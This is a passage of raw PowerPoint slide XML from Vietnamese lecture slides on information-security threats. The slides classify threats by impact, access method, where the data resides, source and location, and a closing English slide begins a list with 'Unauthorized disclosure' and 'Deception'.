            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> từ các hành động cố ý định trước.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3000" b="1"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32542023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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>2. Phân loại nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3000" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo mức độ tác động lên hệ thống thông tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thụ động không làm thay đổi gì về cấu trúc và nội dung hệ thống thông tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> chủ động gây ra những thay đổi nhất định trong cấu trúc và nội dung của hệ thống thông tin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo các giai đoạn tiếp cận của người dùng hoặc các chương trình tới các tài nguyên hệ thống thông tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Thể hiện khi thực hiện tiếp cận tài nguyên hệ thống thông tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Thể hiện sau khi được phép tiếp cận tới hệ thống thông tin.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3000" b="1"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17039382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 TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1"/>
              <a:t>2. Phân loại nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="3000" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo phương pháp tiếp cận tới các tài nguyên hệ thống</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Sử dụng con đường chuẩn thông thường tiếp cận tài nguyên</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Sử dụng các phương tiện ngầm (không chuẩn)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo nơi cư trú hiện tại của thông tin được lưu giữ và xử lý trong hệ thống</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Tiếp cận thông tin tại các bộ nhớ ngoài (sao chép trộm từ ổ đĩa cứng)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Tiếp cận thông tin tại vùng nhớ hoạt động (ROM, RAM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Tiếp cận thông tin đang đi lại trên các đường liên lạc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Tiếp cận thông tin phản xạ từ terminal, hoặc trên máy in.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="1"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11402116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a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>I. TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="551939" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1219200"/>
            <a:ext cx="10210800" cy="5486400"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2700"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1"/>
              <a:t>2. Phân loại nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo nguồn trực tiếp sinh ra</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn sinh ra trực tiếp là môi trường tự nhiên: thiên tai, bão tố, phóng xạ…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn sinh ra trực tiếp là con người: cài cắm nội gián, mua chuộc, sao chụp trộm…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn sinh là các phần mềm hợp pháp: khi chạy chương trình làm việc mà gây nên treo máy hoặc gây ra các biến đổi trong cấu trúc dữ liệu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn sinh là các phần mềm bất hợp pháp: virus, ngựa Trojan, bom logic…</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200"/>
              <a:t> .</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6397594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a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>I. TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="552963" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1752600"/>
            <a:ext cx="10515600" cy="5486400"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1"/>
              <a:t>2. Phân loại nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t>Theo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>vị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>trí</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>nguồn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>sinh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>ra</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sinh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nằm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ngoài</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lãnh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thổ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>kiểm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>soát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nơi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> hệ thống thông tin </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sinh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nằm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ngay</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lãnh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thổ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>kiểm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>soát</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>toà</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nhà</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sinh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>có</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tiếp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cận</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tới</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thiết</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đầu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>cuối</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Nguồn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sinh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>đặt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ngay</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hệ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t>Theo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>mức</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>độ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>phụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>thuộc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>vào</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>hoạt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0" err="1"/>
              <a:t>động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700"/>
              <a:t> hệ thống thông tin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Không </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>phụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>thuộc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vào</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hoạt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>của</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> hệ thống</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Chỉ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xuất</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hiện</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trong</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>quá</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>trình</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tự</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>động</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>xử</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" err="1"/>
              <a:t>lý</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> thông tin.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13616486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a:xfrm>
            <a:off x="1371600" y="304800"/>
            <a:ext cx="10515600" cy="754062"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>I. TỔNG QUAN NGUY C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> GÂY MẤT ATTT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28675" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="1825625"/>
            <a:ext cx="6781800" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Unauthorized disclosure: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t> threat to confidentiality </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Deception: </a:t>
            </a:r>
